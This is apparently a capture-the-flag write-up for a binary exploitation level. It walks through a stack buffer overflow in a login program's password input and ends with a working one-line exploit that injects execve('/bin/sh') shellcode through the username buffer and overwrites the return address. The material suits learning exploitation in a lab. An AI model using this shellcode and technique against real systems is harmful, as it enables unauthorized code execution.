# Level 01

This level exploits a classic stack buffer overflow in the password input. The key insight is that the username is stored in a global variable (`a_user_name`) at a fixed address. We place our shellcode there and overwrite the saved return address (EIP) in the password buffer to redirect execution to it.

### Pseudo Code

```c
080484d0    {
080484d0        int32_t edi;
080484d3        int32_t var_8 = edi;
080484d4        int32_t ebx;
080484d4        int32_t var_c = ebx;
080484ed        void var_54;
080484ed        __builtin_memset(&var_54, 0, 0x40);
080484ef        int32_t var_14 = 0;
080484fe        puts("********* ADMIN LOGIN PROMPT *********");
0804850b        printf("Enter Username: ");
08048528        fgets(&a_user_name, 0x100, stdin);   // <-- global buffer, fixed address
08048528        
0804853b        if (verify_user_name())
0804853b        {
08048557            puts("nope, incorrect username...\n");
08048549            return 1;
0804853b        }
0804853b        
08048557        puts("Enter Password: ");
08048574        void arg_c;
08048574        fgets(&arg_c, 0x64, stdin);           // <-- vulnerable: var_54 = 0x40 bytes, no bounds check
08048580        int32_t eax_2 = verify_user_pass(&arg_c);
08048580        
08048595        if (eax_2 && !eax_2)
080485aa            return 0;
080485aa        
0804859e        puts("nope, incorrect password...\n");
080485a3        return 1;
080484d0    }
```

## Vulnerability

The password buffer `var_54` is `0x40` (64) bytes, but `fgets` reads up to `0x64` (100) bytes. This allows us to overflow past the buffer and saved EBP to overwrite the saved EIP.

## Exploit

```bash
(python -c "print 'dat_wil' + '\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80' + '\n' + 'A'*80 + '\x47\xa0\x04\x08'"; cat) | ./level01
```

- Username: `dat_wil` + shellcode (stored at `a_user_name` = `0x0804a040`, shellcode at `+7`)
- Password: 80 bytes padding (buffer + saved EBP) + return address pointing to shellcode (`0x0804a047`)
- `; cat` keeps stdin open so the shell stays interactive
